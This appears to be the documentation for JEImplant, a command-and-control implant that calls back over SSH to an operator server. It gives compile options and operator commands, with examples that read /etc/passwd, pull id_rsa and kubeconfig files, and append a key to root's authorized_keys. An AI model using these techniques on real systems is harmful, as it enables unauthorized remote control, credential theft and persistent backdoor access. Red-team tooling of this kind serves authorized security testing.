JEImplant
=========
JEImplant is the implant side of JEC2.  At the moment it's a single binary
which calls back via SSH or TLS-wrapped SSH to JEServer and itself acts as an
SSH server for operator connections via JEServer.

Connecting to JEImplant is a simple matter of connecting to JEServer and
proxying through with OpenSSH's `-J` or `ProxyJump` to the appropriate
[implant name](../jeserver.go#list).  This usually looks something like
`ssh -J jeserver m3`.  It's handy to make an 
[SSH config section](./README.md#ssh-config) for the `latest` implant.

There's two ways to interact with JEImplant: single commands or an interactive
shell.

### Single commands
Like so:
```sh
ssh jeimplant uname -a
```

This is particularly useful for [file transfers](#file-read/write).

### Interactive shell
Slightly easier is an interactive shell.  This is a bit like a slightly
neurotic SSH session.  Like so:
```sh
$ ssh jeimplant
[/home/h4x] # We're connected
[/home/h4x] id
uid=1000(h4x) gid=1000(h4x) groups=1000(h4x)
[/home/h4x]
```

Compilation
-----------
Implant compilation is more or less like compiling anything else written in Go,
except that the implant's [private key](#private-key) has to be set at
compile-time, and a couple of other parameters should be set at compile-time.
Eventually, there may be support for compiling to a shared library or something
other than a normal binary.

### Compile-time config
The following variables may be set at compile-time using
`-ldflags "-X 'main.Foo=bar' -X 'main.Tridge=quux'"`.  They set defaults for
execution but, with the exception of the private key, may be changed at runtime
using command-line flags.

Variable        | Default               | Example                                              | Description
----------------|-----------------------|------------------------------------------------------|------------
main.ServerAddr | _none_                | `ssh://example.com:10022`                            | Server [Address](#server-addresses)
main.ServerFP   | _none_                | `SHA256:LfmGUbswbhDOeLcGfXaz59KHNjVK18aA8RmY4jnT7vI` | Server hostkey [fingerprint](#server-fingerprint)
main.PrivKey    | _none_                | _too long_                                           | Implant [private key](#private-key)
main.SSHVersion | `SSH-2.0-OpenSSH_8.6` | `SSH-2.0-OpenSSH_8.6`                                | SSH Client Version

It's probably easier to use [`jegenimplant`](./jegenimplant.md).

### Server Addresses
Server addresses must be specified as a URL in one of the following forms:
- `ssh://host:port` for SSH over TCP
- `tls://host:port` for SSH over TLS over TCP
The port is required.

### Server Fingerprint
The client does its part to prevent MitM by checking the server's fingerprint.
It can be retrieved from the server's key with 
```sh
ssh-keygen -lf ./serverskey | cut -f 2 -d ' '
```
or from the server itself with
```sh
ssh-keyscan -p 10022 127.0.0.1 | ssh-keygen -lf - | tail -n 1 | awk '{print $2}'
```

### Private Key
The implant's private key must be baked-in at compile time by setting
`main.PrivKey`.  The key may either be in PEM format or base64'd PEM format
(i.e. `openssl base64 -A < id_ed25519`).  This typically takes the form of 
```sh
... -X 'main.PrivKey=$(openssl base64 -A < ~/jec2/id_25519_implant)' ...
```

Command-Line Flags
------------------
For an up-to-date list of JEImplant's command-line flags, run JEImplant with
`-h`.  The current flags are
```
  -address address
    	C2 address (default "ssh://example.com:10022")
  -debug
    	Enable debug logging
  -fingerprint fingerprint
    	C2 hostkey SHA256 fingerprint (default "SHA256:LfmGUbswbhDOeLcGfXaz59KHNjVK18aA8RmY4jnT7vI")
  -version banner
    	SSH client version banner (default "SSH-2.0-OpenSSH_8.6")
```

Commands
--------
JEImplant has very few built-ins; most interaction is done via shell commands.
Commands with their own section are linkied.
[iTerm2](https://iterm2.com)-specific commands are noted as such.

When commands need to be [split](https://github.com/magisterquis/simpleshsplit)
into words, splitting is done on unescaped spaces (like `\x20`, not all
whitespace).  This makes it slightly easier to do weird quoting things.

Anything not one of the below commands sent to the implant will be sent to the
standard input of a shell, the same effect as running everything with `s` (and
as a result of the author being sick of typing `s` early on in development).
This means that each command runs in its own shell process, for better or for
worse.  Use `r` is this is a problem.

Command | Description                              | Example
--------|------------------------------------------|--------
`#`     | [Log](../jeserver.md#log) a comment      | `# Crashed sshd, whoops`
`?`     | This help                                | `?`
`c`     | Copy a file to the pasteboard (iTerm2)   | `c ./id_rsa`
`cd`    | Change directory                         | `cd /etc`
`d`     | Download a file (iTerm2)                 | `d ./kubeconfig`
`f`     | [Read/write a file](#file-read/write)    | `f < ./foo` or `f > ./foo` or `f >> ./foo`
`h`     | This help                                | `h`
`q`     | Disconnect from the implant              | `q`
`r`     | Run a new process and get its output     | `r ip bar tridge` <- Doesn't spawn a shell
`s`     | [Execute (a command in) a shell](#shell) | `s` or `s ./foo bar tridge`
`u`     | Upload a file (iTerm2)                   | `u`

### File Read/Write
As an alternative to `c`, `u`, and `d`, which use
[iTerm2 escape codes)(https://iterm2.com/documentation-escape-codes.html),
files can be transferred using `f` using one of the three shell-like operators
below.  The benefit of this over `cat` and similar is it doesn't create a
separate process.  The downside is it could be a bit faster.

Operator             | Description
---------------------|------------
`>`                  | Creates/truncates a file
`>>`                 | Creates/appends to a file
`<` (or no operator) | Reads from a file

With `>` and `>>`, `f` expects base64'd data which can either be copy/pasted
to the terminal or sent to ssh's stdin.

This is clearer with examples.

Example                                          | Description
-------------------------------------------------|------------
`f < /etc/passwd`                                | Read the contents of `/etc/passwd` 
`openssl base64 <./k | ssh jeimplant f > /tmp/k` | Upload `k`, not quickly
`f >> /root/.ssh/authorized_keys`                | Add a line to root's `authorized_keys`, pasting in the output of `openssl base64 </.ssh/id_rsa` and hitting enter a couple of times.

### Shell
By default, any command not listed above is sent to a shell.  For example, if
JEImplant gets `ps awwwfux; uname -a; id`, it does something like
`echo 'ps awwwfux; uname -a; id' | /bin/sh`, minus the `echo` process and the
invisible shell running `echo` and `/bin/sh`.  If spawning a shell per command
is a problem, use `r` to fork and exec without one.

The `s` command with no arguments spawns `/bin/sh` with no arguments and
hooks up the C2 session's to its stdio.  This is useful for shell-in-shell
gymnastics (`docker exec`->`chroot`?) but leaves an extra process running.  Kill the
shell and hit enter a couple of times to get back to normal.
